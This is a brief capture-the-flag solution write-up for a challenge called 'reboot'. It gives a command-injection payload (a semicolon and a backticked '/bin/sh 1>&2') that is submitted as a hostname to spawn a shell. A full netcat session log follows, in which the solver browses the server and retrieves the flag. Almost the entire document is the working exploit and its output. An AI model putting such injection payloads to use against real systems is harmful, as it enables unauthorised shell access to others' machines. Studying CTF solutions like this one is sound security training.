# Solve: 

Use the magic hostname. Make sure to redirect stderr to stdout! 

```
; `/bin/sh 1>&2`
```

```
reboot % nc reboot.chal.cyberjousting.com 1358           
=== MENU ===
1. Set hostname
2. Reboot

Choice: 1
Enter new hostname (30 chars max): ; `/bin/sh 1>&2`
=== MENU ===
1. Set hostname
2. Reboot

Choice: 2
Rebooting...
Usage: grep [OPTION]... PATTERNS [FILE]...
Try 'grep --help' for more information.
cat: write error: Broken pipe
ls
clean.sh
server.py
start.sh
xinetd.sh
cd /
ls
bin
boot
ctf
dev
etc
home
lib
lib64
media
mnt
ohno
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
find ./ohno/ -name "*" | xargs grep "ctf"
grep: ./ohno/: Is a directory
grep: ./ohno/i: Is a directory
grep: ./ohno/i/hope: Is a directory
grep: ./ohno/i/hope/this: Is a directory
grep: ./ohno/i/hope/this/isnt: Is a directory
grep: ./ohno/i/hope/this/isnt/too: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much: Is a directory
grep: ./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much/fun: Is a directory
./ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much/fun/f19eaee3a4e2b88563b31c7c17e2ab33:byuctf{expl0iting_th1s_r3al_w0rld_w4s_s000_ann0ying}
```
